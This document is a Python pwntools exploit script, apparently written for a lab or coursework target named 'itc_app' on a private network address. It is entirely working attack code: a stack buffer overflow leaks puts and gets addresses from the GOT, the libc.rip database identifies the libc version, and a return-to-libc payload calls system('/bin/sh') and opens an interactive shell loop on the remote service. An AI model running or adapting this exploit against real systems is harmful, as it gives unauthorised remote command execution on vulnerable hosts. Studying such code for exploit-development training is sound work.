import requests
import json
from pwn import remote, process, u32, p32, p64, flat, log

remoteIp = '192.168.0.155'
remotePort = 9000
conn = remoteIp
port = remotePort

outputLines_b = 6
outputLines_a = 2
arch = 4

leakNo = 30
leakDelim = b"Welcome"
writeToStack = False

static = "./itc_app"

headers1 = {'Content-Type': 'application/json'}
headers2 = headers1
# (Baumstark, 2020)
findLibcUrl = 'https://libc.rip/api/find'
libcSearchUrl = "https://libc.rip/api/libc/"
redirectStdErr = True

# Check if reverse shell was spawned then handle user input and output for the process
def handle_reverse_shell():
    # Check if shell was sucessfully executed
    noEOF = True
    try:
        proc.sendline(b"whoami"+b" 2>&1")
        print(proc.recv(timeout = 0.1).decode('utf-8'))
    except EOFError:
        noEOF = False

    # Create terminal input with option to automatically redirect stderr to stdout
    commandModifier = b""
    if redirectStdErr:
        commandModifier = b" 2>&1"
    while noEOF:
        command = input("$ ")
        try:
            proc.sendline((command).encode('utf-8')+commandModifier)
            print(proc.recv(timeout = 0.2).decode('utf-8'))
        except EOFError:
            return 200
    # If EOF found return 300
    return 300

# Leak randomised libc address via puts' PLT and function's GOT
def leakViaPuts(conn, port,putOutAddr, msg="puts"):
    global proc

    proc = remote(conn,port)

    pltPutsBytes = p32(pltPuts)
    mainAddrBytes = p32(mainAddr)
    putOutAddrBytes = p32(putOutAddr)
    
    # Create and send puts(*pltOutAddr) buffer overflow payload
    payload = flat(
        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
        pltPutsBytes,    # Overflowed function will execute puts PLT on return
        mainAddrBytes,   # pltPuts will execute main() on return to facilitate subsequent buffer overflows
        putOutAddrBytes  # The first argument to puts PLT
                         # Which is the GOT address provided which points to the randomised libc address of the function
    )
    
    proc.sendline(payload)

    # Skip 'outputLines_b' number of lines so the next read will be the leaked value
    for _ in range(outputLines_b):
        try:
            proc.recvline()
        except EOFError:
            pass
    
    # Get the leaked address
    putsAddr = u32(proc.recv(4))

    # Skip 'outputLines_a' number of lines to make a cleaner output should the program need to read any more lines after
    for _ in range(outputLines_a):
        try:
            proc.recvline()
        except EOFError:
            pass
    log.success("Leaked address of "+msg+": "+hex(putsAddr))
    return putsAddr

# Perform a return-to-libc attack executing system('/bin/sh')
def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
    # Leak randomised libc puts addr
    putsAddr = leakViaPuts(conn, port, gotPuts)

    # Get lib base addr using putsOffset
    libc_address = putsAddr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')

    systemBytes = p32(systemOffset+libc_address)
    exitBytes = p32(exitOffset+libc_address)
    binShBytes = p32(binShOffset+libc_address)
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = flat(
        b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
        systemBytes,     # Overflowed function will execute system() on return
        exitBytes,       # system will execute libc's exit() on return
        binShBytes,      # system's first pararmter 
                         # Which is libc's '/bin/sh' offset making the function call system('/bin/sh')
    )
    proc.sendline(payload)
    log.success("Executed system('/bin/sh') overflow")

    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
    for _ in range(outputLines_a):
        print(proc.recv(timeout = 0.05))
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handle_reverse_shell()
    
# Get an array of all the potential libc versions that fit the puts and gets offsets provided
def findPotentialLibcs(putsAddr,getsAddr):
    data = {"symbols": {"puts": hex(putsAddr),"gets": hex(getsAddr)}}
    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
    responseJson = response.json()
    log.success(f"Retrieved potential libc versions for puts: {hex(putsAddr)} and gets: {hex(getsAddr)}")
    return responseJson

# Find the offsets of functions and '/bin/sh' from the current libc json
def getLibcSymbolOffsets(libcJson):
    # Get the libc id to perform a more thorough search of functions
    libId = libcJson['id']
    libcUrl = libcSearchUrl+libId
    
    # Define extra symbols to retrieve from the database
    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}

    # Request symbols from the datatbase
    response = requests.post(libcUrl, headers=headers2, data=json.dumps(findSymbols))
    symbolJson = response.json()

    # Store the symbols into variables
    putsOff = symbolJson['symbols'].get('puts')
    systemOff = symbolJson['symbols'].get('system')
    exitOff = symbolJson['symbols'].get('exit')
    mprotectOff = symbolJson['symbols'].get('mprotect')
    printfOff = symbolJson['symbols'].get('printf')
    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
    print()
    log.info("Trying offsets for libc version: "+libId)
    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff

if __name__ == "__main__":
    buffSize = 132
    
    # Function offsets (these don't change due to PIE being disabled)
    pltPuts = 0x8048340
    pltGets = 0x08048330
    mainAddr = 0x804847b
    gotPuts = 0x80497ac
    gotGets = 0x80497a8
    
    putsAddr = leakViaPuts(conn,port,gotPuts)
    getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
    responseJson = findPotentialLibcs(putsAddr,getsAddr)

    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
    for item in responseJson:
        # Get the symbol offsets for the specific libc version
        putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)

        # Attempt to execute system('/bin/sh')
        retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))

        # Print exit message depending on the return value
        if retVal == 200:
            print("End of file recieved")
            break
        else:
            log.failure("Recieved premature EOF")
            proc.close()
